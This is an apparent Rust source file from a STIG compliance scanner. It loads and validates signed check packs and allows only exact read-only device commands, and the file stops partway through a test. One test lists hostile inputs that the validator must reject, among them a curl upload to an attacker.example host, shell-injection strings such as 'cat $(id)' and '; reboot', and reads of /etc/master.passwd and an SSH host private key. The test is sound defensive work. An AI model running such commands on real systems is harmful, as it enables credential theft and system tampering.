//! Check-pack loading with deterministic source precedence.

use serde::de::DeserializeOwned;
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::collections::HashSet;
#[cfg(test)]
use std::path::Path;

use crate::checks::{
    predicate::PredicateSource, Check, CheckDefinition, CheckPack, CheckPlatform,
    ImplementationClass,
};
use crate::library::{StigLibrary, TrustedExecutableFile};
use crate::models::stig::StigBenchmark;

#[derive(rust_embed::Embed)]
#[folder = "../../content/check_packs"]
#[include = "*.json"]
struct EmbeddedCheckPacks;

pub(crate) fn embedded_check_pack_paths() -> Vec<String> {
    let mut paths: Vec<_> = EmbeddedCheckPacks::iter()
        .map(|path| path.into_owned())
        .collect();
    paths.sort();
    paths
}

pub(crate) fn embedded_check_pack_bytes(path: &str) -> Option<Vec<u8>> {
    EmbeddedCheckPacks::get(path).map(|content| content.data.into_owned())
}

fn append_canonical_json(value: &serde_json::Value, output: &mut String) -> serde_json::Result<()> {
    match value {
        serde_json::Value::Null => output.push_str("null"),
        serde_json::Value::Bool(value) => {
            output.push_str(if *value { "true" } else { "false" });
        }
        serde_json::Value::Number(value) => output.push_str(&value.to_string()),
        serde_json::Value::String(value) => {
            output.push_str(&serde_json::to_string(value)?);
        }
        serde_json::Value::Array(values) => {
            output.push('[');
            for (index, value) in values.iter().enumerate() {
                if index > 0 {
                    output.push(',');
                }
                append_canonical_json(value, output)?;
            }
            output.push(']');
        }
        serde_json::Value::Object(values) => {
            output.push('{');
            let mut keys: Vec<_> = values.keys().collect();
            keys.sort_unstable();
            for (index, key) in keys.into_iter().enumerate() {
                if index > 0 {
                    output.push(',');
                }
                output.push_str(&serde_json::to_string(key)?);
                output.push(':');
                append_canonical_json(&values[key], output)?;
            }
            output.push('}');
        }
    }
    Ok(())
}

/// Stable semantic digest used in checklist provenance and live decision
/// oracles. Object keys are sorted recursively, arrays retain source order,
/// serde defaults remain explicit, and strings remain UTF-8.
pub fn canonical_json_sha256<T: Serialize>(value: &T) -> crate::Result<String> {
    let value = serde_json::to_value(value)?;
    let mut canonical = String::new();
    append_canonical_json(&value, &mut canonical)?;
    Ok(format!("{:x}", Sha256::digest(canonical.as_bytes())))
}

#[derive(Serialize)]
struct EvaluationPlanBinding<'a> {
    stig_id: &'a str,
    stig_release: &'a str,
    benchmark_sha256: &'a str,
    check_pack_sha256: &'a str,
    organization_policy_sha256: Option<&'a str>,
}

#[derive(Serialize)]
struct EvaluationPlanWithAnswerFileBinding<'a> {
    stig_id: &'a str,
    stig_release: &'a str,
    benchmark_sha256: &'a str,
    check_pack_sha256: &'a str,
    organization_policy_sha256: Option<&'a str>,
    answer_file_sha256: &'a str,
}

#[derive(Serialize)]
struct EvaluationPlanAnswerFileBinding<'a> {
    id: &'a str,
    sha256: &'a str,
}

#[derive(Serialize)]
struct EvaluationPlanWithAnswerFilesBinding<'a> {
    stig_id: &'a str,
    stig_release: &'a str,
    benchmark_sha256: &'a str,
    check_pack_sha256: &'a str,
    organization_policy_sha256: Option<&'a str>,
    answer_files: Vec<EvaluationPlanAnswerFileBinding<'a>>,
}

/// Bind every effective input which can change an automated determination.
pub fn evaluation_plan_sha256(
    stig_id: &str,
    stig_release: &str,
    benchmark_sha256: &str,
    check_pack_sha256: &str,
    organization_policy_sha256: Option<&str>,
) -> crate::Result<String> {
    canonical_json_sha256(&EvaluationPlanBinding {
        stig_id,
        stig_release,
        benchmark_sha256,
        check_pack_sha256,
        organization_policy_sha256,
    })
}

/// Bind an answer file in addition to every automated-evaluation input. This
/// is a separate schema rather than an optional field on the original binding
/// so previously persisted evaluation-plan digests remain verifiable.
pub fn evaluation_plan_sha256_with_answer_file(
    stig_id: &str,
    stig_release: &str,
    benchmark_sha256: &str,
    check_pack_sha256: &str,
    organization_policy_sha256: Option<&str>,
    answer_file_sha256: &str,
) -> crate::Result<String> {
    canonical_json_sha256(&EvaluationPlanWithAnswerFileBinding {
        stig_id,
        stig_release,
        benchmark_sha256,
        check_pack_sha256,
        organization_policy_sha256,
        answer_file_sha256,
    })
}

/// Bind an ordered set of answer files in addition to every automated input.
///
/// Both each library-local identifier and canonical content digest participate
/// in the plan. Array order is intentionally retained because repeated CLI
/// `--answer` arguments are applied in user-supplied order.
pub fn evaluation_plan_sha256_with_answer_files(
    stig_id: &str,
    stig_release: &str,
    benchmark_sha256: &str,
    check_pack_sha256: &str,
    organization_policy_sha256: Option<&str>,
    answer_files: &[(&str, &str)],
) -> crate::Result<String> {
    let answer_files = answer_files
        .iter()
        .map(|(id, sha256)| EvaluationPlanAnswerFileBinding { id, sha256 })
        .collect();
    canonical_json_sha256(&EvaluationPlanWithAnswerFilesBinding {
        stig_id,
        stig_release,
        benchmark_sha256,
        check_pack_sha256,
        organization_policy_sha256,
        answer_files,
    })
}

/// Return effective check-pack vulnerability IDs that have no exact rule in
/// the installed benchmark. Extra benchmark rules are allowed; executable
/// checks without a benchmark finding target are not.
pub fn check_pack_vuln_ids_missing_from_benchmark(
    benchmark: &StigBenchmark,
    check_packs: &[CheckPack],
) -> Vec<String> {
    let benchmark_vuln_ids: HashSet<_> = benchmark
        .rules
        .iter()
        .map(|rule| rule.vuln_id.as_str())
        .collect();
    let mut missing: Vec<_> = check_packs
        .iter()
        .flat_map(|pack| pack.checks.iter())
        .map(|definition| definition.vuln_id.as_str())
        .filter(|vuln_id| !benchmark_vuln_ids.contains(vuln_id))
        .map(str::to_owned)
        .collect();
    missing.sort();
    missing.dedup();
    missing
}

#[derive(Debug, Default)]
pub struct CheckPackRegistry {
    packs: Vec<CheckPack>,
    embedded_loaded: bool,
}

impl CheckPackRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    /// Test-only raw filesystem loader. Production library content must pass
    /// through `load_from_trusted_library_directory`.
    #[cfg(test)]
    fn load_from_directory_with_priority(
        &mut self,
        dir: &Path,
        base_priority: i32,
    ) -> crate::Result<usize> {
        if !dir.exists() {
            return Ok(0);
        }

        let mut paths = Vec::new();
        for entry in std::fs::read_dir(dir)? {
            let path = entry?.path();
            if path.is_file()
                && matches!(
                    path.extension().and_then(|value| value.to_str()),
                    Some("json" | "yaml" | "yml")
                )
            {
                paths.push(path);
            }
        }
        paths.sort();

        for path in &paths {
            let content = std::fs::read_to_string(path)?;
            let pack: CheckPack = match path.extension().and_then(|value| value.to_str()) {
                Some("json") => parse(&content)?,
                Some("yaml" | "yml") => serde_norway::from_str(&content)
                    .map_err(|error| crate::Error::Other(error.to_string()))?,
                _ => unreachable!(),
            };
            self.register_pack(pack, base_priority)?;
        }
        Ok(paths.len())
    }

    /// Load library executable content through its retained signed-manifest
    /// proofs. This is the only filesystem loader suitable for production
    /// evaluation. The supplied public keys are the current trust anchors.
    pub fn load_from_trusted_library_directory(
        &mut self,
        library: &StigLibrary,
        directory: &str,
        base_priority: i32,
        trusted_public_keys: &[[u8; 32]],
    ) -> crate::Result<usize> {
        let files = library.load_trusted_executable_files(directory, trusted_public_keys)?;
        self.load_from_verified_library_files(&files, base_priority)
    }

    /// Parse executable files whose signed provenance and bytes were already
    /// verified by the library while holding its transaction lock.
    pub(crate) fn load_from_verified_library_files(
        &mut self,
        files: &[TrustedExecutableFile],
        base_priority: i32,
    ) -> crate::Result<usize> {
        for file in files {
            let content = std::str::from_utf8(&file.bytes).map_err(|error| {
                crate::Error::Other(format!(
                    "trusted check pack {} is not UTF-8: {error}",
                    file.relative_path.display()
                ))
            })?;
            let pack: CheckPack = match file
                .relative_path
                .extension()
                .and_then(|value| value.to_str())
            {
                Some("json") => parse(content)?,
                Some("yaml" | "yml") => serde_norway::from_str(content)
                    .map_err(|error| crate::Error::Other(error.to_string()))?,
                _ => unreachable!("trusted executable loader filters extensions"),
            };
            self.register_pack(pack, base_priority)?;
        }
        Ok(files.len())
    }

    fn register_pack(&mut self, mut pack: CheckPack, base_priority: i32) -> crate::Result<()> {
        validate_pack(&pack)?;
        if let Some(existing) = self
            .packs
            .iter()
            .find(|existing| existing.stig_id == pack.stig_id)
        {
            if existing.platform != pack.platform {
                return Err(crate::Error::Other(format!(
                    "check pack {} platform {:?} conflicts with installed baseline {:?}",
                    pack.stig_id, pack.platform, existing.platform
                )));
            }
        }
        // Source tier is assigned by the trusted caller. Untrusted pack
        // metadata must never cross tiers or outrank curated content.
        pack.priority = base_priority;
        self.packs.push(pack);
        Ok(())
    }

    /// Register check packs compiled into the binary unless a filesystem pack
    /// was already registered. Filesystem content for the same STIG must never
    /// suppress the reviewed, embedded baseline.
    pub fn load_embedded(&mut self) -> crate::Result<usize> {
        if self.embedded_loaded {
            return Ok(0);
        }
        let mut paths: Vec<_> = EmbeddedCheckPacks::iter().collect();
        paths.sort();
        let mut embedded = Vec::with_capacity(paths.len());
        for path in paths {
            let content = EmbeddedCheckPacks::get(path.as_ref()).ok_or_else(|| {
                crate::Error::Other(format!("embedded check pack is missing: {path}"))
            })?;
            let mut pack: CheckPack = serde_json::from_slice(content.data.as_ref())?;
            validate_pack(&pack)?;
            // Curated embedded rules always win same-vulnerability conflicts;
            // custom/generated packs may add only non-overlapping behavior.
            pack.priority = 0;
            embedded.push(pack);
        }
        let count = embedded.len();
        self.packs.extend(embedded);
        self.embedded_loaded = true;
        Ok(count)
    }

    pub fn check_packs_for_stig(&self, stig_id: &str) -> Vec<&CheckPack> {
        let mut packs: Vec<_> = self
            .packs
            .iter()
            .filter(|pack| pack.stig_id == stig_id)
            .collect();
        packs.sort_by_key(|pack| pack.priority);
        packs
    }

    /// Return only packs whose declared release exactly matches the imported
    /// benchmark release. STIG IDs are not stable evaluation semantics across
    /// releases.
    pub fn check_packs_for_stig_release(&self, stig_id: &str, release: &str) -> Vec<&CheckPack> {
        self.check_packs_for_stig(stig_id)
            .into_iter()
            .filter(|pack| pack.version == release)
            .collect()
    }

    pub fn checks_for_stig_release(&self, stig_id: &str, release: &str) -> Vec<&CheckDefinition> {
        self.check_packs_for_stig_release(stig_id, release)
            .into_iter()
            .flat_map(|pack| pack.checks.iter())
            .collect()
    }
}

fn parse<T: DeserializeOwned>(content: &str) -> crate::Result<T> {
    serde_json::from_str(content).map_err(Into::into)
}

/// Validate a check pack at every executable-content ingress boundary.
pub fn validate_pack(pack: &CheckPack) -> crate::Result<()> {
    if pack.stig_id.trim().is_empty() {
        return Err(crate::Error::Other(
            "check pack STIG ID must not be empty".to_string(),
        ));
    }
    let (expected_platform, expected_release) =
        supported_pack_contract(&pack.stig_id).ok_or_else(|| {
            crate::Error::Other(format!(
                "check pack {} is outside the v0.3 supported-target contract",
                pack.stig_id
            ))
        })?;
    if pack.platform != expected_platform {
        return Err(crate::Error::Other(format!(
            "check pack {} must use platform {:?}, got {:?}",
            pack.stig_id, expected_platform, pack.platform
        )));
    }
    if pack.version != expected_release {
        return Err(crate::Error::Other(format!(
            "check pack {} must target release {}, got {}",
            pack.stig_id, expected_release, pack.version
        )));
    }
    let mut vuln_ids = HashSet::new();
    for definition in &pack.checks {
        if definition.vuln_id.trim().is_empty() {
            return Err(crate::Error::Other(format!(
                "check pack {} contains an empty vulnerability ID",
                pack.stig_id
            )));
        }
        if definition.platform != pack.platform {
            return Err(crate::Error::Other(format!(
                "check {} platform {:?} does not match pack {} platform {:?}",
                definition.vuln_id, definition.platform, pack.stig_id, pack.platform
            )));
        }
        if !vuln_ids.insert(&definition.vuln_id) {
            return Err(crate::Error::Other(format!(
                "check pack {} contains duplicate vulnerability ID {}",
                pack.stig_id, definition.vuln_id
            )));
        }
        validate_automation_metadata(definition).map_err(|error| {
            crate::Error::Other(format!(
                "check pack {} rule {} has invalid automation metadata: {error}",
                pack.stig_id, definition.vuln_id
            ))
        })?;
        validate_typed_check_identity(&definition.vuln_id, &definition.check, true).map_err(
            |error| {
                crate::Error::Other(format!(
                    "check pack {} rule {} has an invalid typed-check identity: {error}",
                    pack.stig_id, definition.vuln_id
                ))
            },
        )?;
        validate_check_capabilities(pack.platform, &definition.check).map_err(|error| {
            crate::Error::Other(format!(
                "check pack {} rule {} is not read-only: {error}",
                pack.stig_id, definition.vuln_id
            ))
        })?;
        validate_expected(&definition.expected).map_err(|error| {
            crate::Error::Other(format!(
                "check pack {} rule {} has an invalid expected result: {error}",
                pack.stig_id, definition.vuln_id
            ))
        })?;
    }
    Ok(())
}

fn validate_automation_metadata(definition: &CheckDefinition) -> Result<(), String> {
    if let Some(release) = definition.introduction_release.as_deref() {
        let parts: Vec<&str> = release.split('.').collect();
        if !(2..=3).contains(&parts.len())
            || parts.iter().any(|part| {
                part.is_empty()
                    || !part.bytes().all(|byte| byte.is_ascii_digit())
                    || (part.len() > 1 && part.starts_with('0'))
            })
        {
            return Err(
                "introduction_release must be a numeric MAJOR.MINOR[.PATCH] value".to_string(),
            );
        }
    } else if definition.implementation_class != ImplementationClass::Unknown {
        return Err("introduction_release is required for a classified implementation".to_string());
    }

    let class_matches = match definition.implementation_class {
        ImplementationClass::DeclarativePredicate => {
            matches!(definition.check, Check::Predicate { .. })
        }
        ImplementationClass::LegacyDeclarative => legacy_declarative(&definition.check),
        ImplementationClass::ReviewedImperative => reviewed_imperative(&definition.check),
        // Backward-compatible trusted legacy content stays executable, while
        // release scorecards preserve both values as unknown. Shipped content
        // has a stricter static gate and is explicitly migrated.
        ImplementationClass::Unknown => true,
    };
    if !class_matches {
        return Err(format!(
            "implementation_class {:?} does not match the executable check variant",
            definition.implementation_class
        ));
    }
    if matches!(definition.check, Check::Predicate { .. })
        && !matches!(definition.expected, crate::checks::ExpectedResult::IsTrue)
    {
        return Err(
            "predicate checks must use expected.type=is_true; negation belongs in the AST"
                .to_string(),
        );
    }
    Ok(())
}

fn legacy_declarative(check: &Check) -> bool {
    match check {
        Check::Command { .. } | Check::ConfigLine { .. } => true,
        Check::All { checks } | Check::Any { checks } => {
            !checks.is_empty() && checks.iter().all(legacy_declarative)
        }
        _ => false,
    }
}

fn reviewed_imperative(check: &Check) -> bool {
    matches!(
        check,
        Check::BsdAuditClassSelection { .. }
            | Check::BsdPfEnabled
            | Check::CiscoVtySessionLimit
            | Check::CiscoLoginBlockFor
            | Check::CiscoInterfaceAclDenyLogInput
            | Check::CiscoPersistentAuditModificationProtection
            | Check::CiscoPersistentAuditDeletionProtection
            | Check::CiscoFileSystemPrivilege
            | Check::CiscoSingleLocalFallbackAccount
            | Check::CiscoPasswordMinimumLength
            | Check::CiscoManagementIdleTimeout
            | Check::CiscoLoggingBufferCapacity
            | Check::CiscoLoggingTrapSeverity
            | Check::CiscoRedundantAuthoritativeNtpSources
            | Check::CiscoNtpAuthentication
            | Check::CiscoSshMacAlgorithms
            | Check::CiscoSshEncryptionAlgorithms
            | Check::CiscoSyslogServerCount
    )
}

fn validate_typed_check_identity(
    vuln_id: &str,
    check: &Check,
    top_level: bool,
) -> Result<(), String> {
    let expected = match check {
        Check::BsdAuditClassSelection { classes } => {
            let required: &[&str] =
                match vuln_id {
                    "V-203767" => &["lo"],
                    "V-203621" => &["aa"],
                    "V-203774" => &["ad"],
                    "V-203772" => &["fr", "fw", "fa", "fm", "fc", "fd"],
                    _ => return Err(
                        "bsd_audit_class_selection is reserved for the reviewed GPOS audit rules"
                            .to_string(),
                    ),
                };
            if classes.len() != required.len()
                || !required.iter().all(|class| {
                    classes
                        .iter()
                        .filter(|candidate| candidate.as_str() == *class)
                        .count()
                        == 1
                })
            {
                return Err(format!(
                    "bsd_audit_class_selection for {vuln_id} requires exactly {required:?}"
                ));
            }
            Some((vuln_id, "bsd_audit_class_selection"))
        }
        Check::BsdPfEnabled => Some(("V-203784", "bsd_pf_enabled")),
        Check::CiscoVtySessionLimit => Some(("V-215807", "cisco_vty_session_limit")),
        Check::CiscoLoginBlockFor => Some(("V-215813", "cisco_login_block_for")),
        Check::CiscoInterfaceAclDenyLogInput => {
            Some(("V-215818", "cisco_interface_acl_deny_log_input"))
        }
        Check::CiscoPersistentAuditModificationProtection => {
            Some(("V-215820", "cisco_persistent_audit_modification_protection"))
        }
        Check::CiscoPersistentAuditDeletionProtection => {
            Some(("V-215821", "cisco_persistent_audit_deletion_protection"))
        }
        Check::CiscoFileSystemPrivilege => Some(("V-215822", "cisco_file_system_privilege")),
        Check::CiscoSingleLocalFallbackAccount => {
            Some(("V-215824", "cisco_single_local_fallback_account"))
        }
        Check::CiscoPasswordMinimumLength => Some(("V-215826", "cisco_password_minimum_length")),
        Check::CiscoManagementIdleTimeout => Some(("V-215833", "cisco_management_idle_timeout")),
        Check::CiscoLoggingBufferCapacity => Some(("V-215836", "cisco_logging_buffer_capacity")),
        Check::CiscoLoggingTrapSeverity => Some(("V-215837", "cisco_logging_trap_severity")),
        Check::CiscoRedundantAuthoritativeNtpSources => {
            Some(("V-215838", "cisco_redundant_authoritative_ntp_sources"))
        }
        Check::CiscoNtpAuthentication => Some(("V-215843", "cisco_ntp_authentication")),
        Check::CiscoSshMacAlgorithms => Some(("V-215844", "cisco_ssh_mac_algorithms")),
        Check::CiscoSshEncryptionAlgorithms => {
            Some(("V-215845", "cisco_ssh_encryption_algorithms"))
        }
        Check::CiscoSyslogServerCount => Some(("V-220139", "cisco_syslog_server_count")),
        Check::All { checks } | Check::Any { checks } => {
            for nested in checks {
                validate_typed_check_identity(vuln_id, nested, false)?;
            }
            None
        }
        _ => None,
    };
    if let Some((expected_vuln_id, check_name)) = expected {
        if !top_level {
            return Err("typed checks must be top-level definitions".to_string());
        }
        if vuln_id != expected_vuln_id {
            return Err(format!("{check_name} is reserved for {expected_vuln_id}"));
        }
    }
    Ok(())
}

fn supported_pack_contract(stig_id: &str) -> Option<(CheckPlatform, &'static str)> {
    match stig_id {
        "NetApp_ONTAP_DSC_9-x_STIG" => Some((CheckPlatform::Ontap, "V2R4")),
        "General_Purpose_Operating_System" => Some((CheckPlatform::Bsd, "V3R3")),
        "Cisco_IOS-XE_Router_NDM_STIG" => Some((CheckPlatform::CiscoIos, "V3R7")),
        _ => None,
    }
}

fn validate_expected(expected: &crate::checks::ExpectedResult) -> Result<(), String> {
    use crate::checks::ExpectedResult;
    match expected {
        ExpectedResult::Matches { pattern } => validate_nonempty_regex(pattern),
        ExpectedResult::MatchCountAtLeast { pattern, min } => {
            if *min == 0 {
                return Err("match_count_at_least.min must be greater than zero".to_string());
            }
            validate_nonempty_regex(pattern)
        }
        ExpectedResult::NotContains { substring } => {
            if substring.trim().is_empty() {
                Err("not_contains substring must not be empty".to_string())
            } else {
                Ok(())
            }
        }
        ExpectedResult::IsTrue => Ok(()),
    }
}

fn validate_nonempty_regex(pattern: &str) -> Result<(), String> {
    if pattern.trim().is_empty() {
        return Err("regex pattern must not be empty".to_string());
    }
    let regex = regex::Regex::new(pattern).map_err(|error| format!("invalid regex: {error}"))?;
    if regex.is_match("") {
        return Err("regex must not match empty input".to_string());
    }
    Ok(())
}

fn validate_check_capabilities(platform: CheckPlatform, check: &Check) -> Result<(), String> {
    match check {
        Check::Predicate { program } => {
            program.validate()?;
            match (&program.source, platform) {
                (PredicateSource::NetworkConfig, CheckPlatform::CiscoIos)
                | (
                    PredicateSource::Observation { .. },
                    CheckPlatform::Ontap | CheckPlatform::Bsd,
                ) => Ok(()),
                (PredicateSource::NetworkConfig, _) => Err(
                    "network_config predicate sources are supported only for Cisco IOS-XE"
                        .to_string(),
                ),
                (PredicateSource::Observation { .. }, _) => Err(
                    "observation predicate sources are supported only for ONTAP and FreeBSD"
                        .to_string(),
                ),
            }
        }
        Check::Command {
            command,
            pattern,
            is_regex,
        } if matches!(platform, CheckPlatform::Ontap | CheckPlatform::Bsd) => {
            validate_read_only_command(platform, command)?;
            if let Some(pattern) = pattern {
                if pattern.trim().is_empty() {
                    return Err("command predicate must not be empty".to_string());
                }
                if *is_regex {
                    validate_nonempty_regex(pattern)?;
                }
            }
            Ok(())
        }
        Check::Command { .. } => {
            Err("raw command checks are supported only for ONTAP and FreeBSD".to_string())
        }
        Check::ConfigLine {
            pattern, context, ..
        } if platform == CheckPlatform::CiscoIos => {
            if pattern.trim().is_empty() {
                return Err("configuration-line pattern must not be empty".to_string());
            }
            if context
                .as_ref()
                .is_some_and(|value| value.trim().is_empty())
            {
                return Err("configuration-line context must not be empty".to_string());
            }
            Ok(())
        }
        Check::ConfigLine { .. } => {
            Err("configuration-line checks are supported only for Cisco IOS-XE".to_string())
        }
        Check::BsdAuditClassSelection { .. } | Check::BsdPfEnabled
            if platform == CheckPlatform::Bsd =>
        {
            Ok(())
        }
        Check::BsdAuditClassSelection { .. } | Check::BsdPfEnabled => {
            Err("typed FreeBSD checks are supported only for FreeBSD".to_string())
        }
        Check::CiscoVtySessionLimit
        | Check::CiscoLoginBlockFor
        | Check::CiscoInterfaceAclDenyLogInput
        | Check::CiscoPersistentAuditModificationProtection
        | Check::CiscoPersistentAuditDeletionProtection
        | Check::CiscoFileSystemPrivilege
        | Check::CiscoSingleLocalFallbackAccount
        | Check::CiscoPasswordMinimumLength
        | Check::CiscoManagementIdleTimeout
        | Check::CiscoLoggingBufferCapacity
        | Check::CiscoLoggingTrapSeverity
        | Check::CiscoRedundantAuthoritativeNtpSources
        | Check::CiscoNtpAuthentication
        | Check::CiscoSshMacAlgorithms
        | Check::CiscoSshEncryptionAlgorithms
        | Check::CiscoSyslogServerCount
            if platform == CheckPlatform::CiscoIos =>
        {
            Ok(())
        }
        Check::CiscoVtySessionLimit
        | Check::CiscoLoginBlockFor
        | Check::CiscoInterfaceAclDenyLogInput
        | Check::CiscoPersistentAuditModificationProtection
        | Check::CiscoPersistentAuditDeletionProtection
        | Check::CiscoFileSystemPrivilege
        | Check::CiscoSingleLocalFallbackAccount
        | Check::CiscoPasswordMinimumLength
        | Check::CiscoManagementIdleTimeout
        | Check::CiscoLoggingBufferCapacity
        | Check::CiscoLoggingTrapSeverity
        | Check::CiscoRedundantAuthoritativeNtpSources
        | Check::CiscoNtpAuthentication
        | Check::CiscoSshMacAlgorithms
        | Check::CiscoSshEncryptionAlgorithms
        | Check::CiscoSyslogServerCount => {
            Err("typed Cisco checks are supported only for Cisco IOS-XE".to_string())
        }
        Check::All { checks } | Check::Any { checks } => {
            if checks.is_empty() {
                return Err("compound checks must not be empty".to_string());
            }
            for nested in checks {
                validate_check_capabilities(platform, nested)?;
            }
            Ok(())
        }
    }
}

/// Raw commands are an executable-content boundary. Permit only exact,
/// read-only command grammars used by reviewed packs. An executable allowlist
/// alone is insufficient: several inspection tools also expose mutating
/// subcommands or assignment forms.
pub(crate) fn validate_read_only_command(
    platform: CheckPlatform,
    command: &str,
) -> Result<(), String> {
    let command = command.trim();
    if command.is_empty()
        || command.chars().any(|character| {
            character.is_control()
                || !(character.is_ascii_alphanumeric()
                    || matches!(
                        character,
                        ' ' | '/' | '.' | '_' | '-' | ':' | ',' | '@' | '%'
                    ))
        })
    {
        return Err("raw command contains shell control or expansion syntax".into());
    }

    let tokens: Vec<&str> = command.split_whitespace().collect();
    let first = tokens.first().copied().unwrap_or_default();
    let allowed = match platform {
        CheckPlatform::Ontap => APPROVED_ONTAP_COMMANDS.contains(&command),
        CheckPlatform::Bsd => APPROVED_FREEBSD_COMMANDS.contains(&command),
        CheckPlatform::CiscoIos => false,
    };
    if !allowed {
        return Err(format!(
            "program or device command is not approved: {first}"
        ));
    }
    Ok(())
}

const APPROVED_ONTAP_COMMANDS: &[&str] = &[
    "cluster log-forwarding show",
    "cluster time-service ntp server show",
    "security config show",
    "security login role config show -role admin -fields passwd-alphanum",
    "security login role config show -role admin -fields passwd-min-lowercase-chars",
    "security login role config show -role admin -fields passwd-min-special-chars",
    "security login role config show -role admin -fields passwd-min-uppercase-chars",
    "security login role config show -role admin -fields passwd-minlength",
    "security login show -role admin -authentication-method domain",
    "security login show -role admin -authentication-method password",
    "security session limit show -interface cli",
    "system timeout show",
    "vserver audit show -fields audit-guarantee",
];

const APPROVED_FREEBSD_COMMANDS: &[&str] = &[
    "cat /etc/security/audit_control",
    "cat /etc/security/audit_user",
    "service auditd onestatus",
    "service pf onestatus",
    "sha256 -q /etc/security/audit_class",
    "sha256 -q /etc/security/audit_event",
];

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::{Check, CheckPlatform, ExpectedResult};

    #[test]
    fn embedded_packs_load_once() {
        let mut registry = CheckPackRegistry::new();
        assert!(registry.load_embedded().unwrap() > 0);
        assert_eq!(registry.load_embedded().unwrap(), 0);
    }

    #[test]
    fn canonical_json_digest_sorts_every_object_and_preserves_utf8() {
        let left = serde_json::json!({
            "z": {"b": 2, "a": 1},
            "a": ["é", true],
        });
        let right = serde_json::json!({
            "a": ["é", true],
            "z": {"a": 1, "b": 2},
        });
        assert_eq!(
            canonical_json_sha256(&left).unwrap(),
            canonical_json_sha256(&right).unwrap()
        );
        assert_eq!(
            canonical_json_sha256(&left).unwrap(),
            format!(
                "{:x}",
                Sha256::digest(r#"{"a":["é",true],"z":{"a":1,"b":2}}"#.as_bytes())
            )
        );
    }

    #[test]
    fn filesystem_priorities_are_deterministic() {
        let dir = tempfile::TempDir::new().unwrap();
        let pack = CheckPack {
            stig_id: "General_Purpose_Operating_System".to_string(),
            platform: CheckPlatform::Bsd,
            version: "V3R3".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-1".to_string(),
                platform: CheckPlatform::Bsd,
                check: Check::Command {
                    command: "service auditd onestatus".to_string(),
                    pattern: None,
                    is_regex: false,
                },
                expected: ExpectedResult::Matches {
                    pattern: r"(?i)\bauditd\s+is\s+running\b".to_string(),
                },
                description: None,
                implementation_class: ImplementationClass::LegacyDeclarative,
                introduction_release: Some("0.3".to_string()),
            }],
        };
        std::fs::write(
            dir.path().join("test.json"),
            serde_json::to_vec(&pack).unwrap(),
        )
        .unwrap();
        let mut registry = CheckPackRegistry::new();
        registry
            .load_from_directory_with_priority(dir.path(), 20)
            .unwrap();
        assert_eq!(
            registry.check_packs_for_stig("General_Purpose_Operating_System")[0].priority,
            20
        );
    }

    #[test]
    fn filesystem_pack_cannot_suppress_same_stig_embedded_baseline() {
        let dir = tempfile::TempDir::new().unwrap();
        let pack = CheckPack {
            stig_id: "NetApp_ONTAP_DSC_9-x_STIG".to_string(),
            platform: CheckPlatform::Ontap,
            version: "V2R4".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-246923".to_string(),
                platform: CheckPlatform::Ontap,
                check: Check::Command {
                    command: "system timeout show".to_string(),
                    pattern: None,
                    is_regex: false,
                },
                expected: ExpectedResult::Matches {
                    pattern: "^malicious-timeout$".to_string(),
                },
                description: None,
                implementation_class: ImplementationClass::LegacyDeclarative,
                introduction_release: Some("0.3".to_string()),
            }],
        };
        std::fs::write(
            dir.path().join("ontap.json"),
            serde_json::to_vec(&pack).unwrap(),
        )
        .unwrap();

        let mut registry = CheckPackRegistry::new();
        registry
            .load_from_directory_with_priority(dir.path(), 20)
            .unwrap();
        assert!(registry.load_embedded().unwrap() > 0);

        let ontap = registry.check_packs_for_stig("NetApp_ONTAP_DSC_9-x_STIG");
        assert_eq!(ontap.len(), 2);
        assert_eq!(ontap[0].priority, 0);
        assert_eq!(ontap[1].priority, 20);
        let curated = ontap[0]
            .checks
            .iter()
            .find(|check| check.vuln_id == "V-246923")
            .unwrap();
        assert!(matches!(
            &curated.expected,
            ExpectedResult::Matches { pattern } if pattern != "^malicious-timeout$"
        ));
    }

    #[test]
    fn wrong_platform_same_stig_pack_is_rejected_without_suppressing_baseline() {
        let dir = tempfile::TempDir::new().unwrap();
        let pack = CheckPack {
            stig_id: "NetApp_ONTAP_DSC_9-x_STIG".to_string(),
            platform: CheckPlatform::Bsd,
            version: "V2R4".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-WRONG".to_string(),
                platform: CheckPlatform::Bsd,
                check: Check::Command {
                    command: "cat /etc/ntp.conf".to_string(),
                    pattern: None,
                    is_regex: false,
                },
                expected: ExpectedResult::IsTrue,
                description: None,
                implementation_class: ImplementationClass::LegacyDeclarative,
                introduction_release: Some("0.3".to_string()),
            }],
        };
        std::fs::write(
            dir.path().join("wrong.json"),
            serde_json::to_vec(&pack).unwrap(),
        )
        .unwrap();

        let mut registry = CheckPackRegistry::new();
        registry.load_embedded().unwrap();
        assert!(registry
            .load_from_directory_with_priority(dir.path(), 900)
            .is_err());
        let ontap = registry.check_packs_for_stig("NetApp_ONTAP_DSC_9-x_STIG");
        assert_eq!(ontap.len(), 1);
        assert_eq!(ontap[0].platform, CheckPlatform::Ontap);
        assert!(ontap[0]
            .checks
            .iter()
            .all(|check| check.vuln_id != "V-WRONG"));
    }

    #[test]
    fn raw_commands_reject_mutation_network_and_shell_execution() {
        for command in [
            "curl https://attacker.example/upload",
            "cat /etc/passwd; reboot",
            "cat $(id)",
            "show running-config | tee bootflash:copy",
            "service sshd restart",
            "pkg install x",
            "sysctl kern.foo=1",
            "FOO=bar cat /etc/ntp.conf",
            "cat /etc/login.conf",
            "cat /etc/motd.template /etc/motd",
            "cat /etc/ntp.conf",
            "cat /etc/pam.d/passwd",
            "cat /etc/rc.conf",
            "cat /etc/ssh/sshd_config",
            "freebsd-version -k",
            "cat /etc/master.passwd",
            "cat /etc/ssh/ssh_host_ed25519_key",
            "cat /etc/rc.conf /etc/master.passwd",
            "freebsd-version -k extra",
        ] {
            assert!(validate_read_only_command(CheckPlatform::Bsd, command).is_err());
        }
        for command in [
            "security login show -role admin modify",
            "security login modify -role admin",
            "system timeout show; system timeout modify 0",
            "system timeout show -fields timeout modify 0",
        ] {
            assert!(validate_read_only_command(CheckPlatform::Ontap, command).is_err());
        }
        for command in [
            "service auditd onestatus",
            "cat /etc/security/audit_control",
            "cat /etc/security/audit_user",
            "sha256 -q /etc/security/audit_class",
            "sha256 -q /etc/security/audit_event",
            "service pf onestatus",
        ] {
